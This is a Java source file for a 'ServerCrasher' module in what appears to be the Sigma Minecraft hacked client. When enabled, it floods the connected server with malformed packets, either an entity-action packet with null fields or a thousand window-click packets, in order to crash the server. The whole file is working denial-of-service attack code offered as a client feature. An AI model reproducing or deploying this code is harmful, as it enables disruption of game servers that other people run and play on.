package info.sigmaclient.sigma.modules.world;

import info.sigmaclient.sigma.config.values.ModeValue;
import info.sigmaclient.sigma.modules.Category;
import info.sigmaclient.sigma.modules.Module;
import net.minecraft.inventory.container.ClickType;
import net.minecraft.network.play.client.CClickWindowPacket;
import net.minecraft.network.play.client.CEntityActionPacket;

import java.util.Objects;
import top.fl0wowp4rty.phantomshield.annotations.Native;

public class ServerCrasher extends Module {
    public ModeValue mode = new ModeValue("Type", "UseEntity", new String[]{
            "Null",
            "Swap"
    });
    public ServerCrasher() {
        super("ServerCrasher", Category.World, "Try doing .bcrash");
     registerValue(mode);
    }
    @Override
    public void onEnable() {
        enabled = false;
        switch (mode.getValue()) {
            case "Null":
                Objects.requireNonNull(mc.getConnection()).sendPacketNOEvent(new CEntityActionPacket(null, null));
                break;
            case "Swap":
                for (int i = 0; i < 1000; i++) {
                    mc.getConnection().sendPacket(new CClickWindowPacket(
                            mc.player.container.windowId,
                            69,
                            0,
                            ClickType.PICKUP,
                            mc.player.getHeldItemMainhand(),
                            (short) 0
                    ));
                }
                break;
        }
        super.onEnable();
    }
}
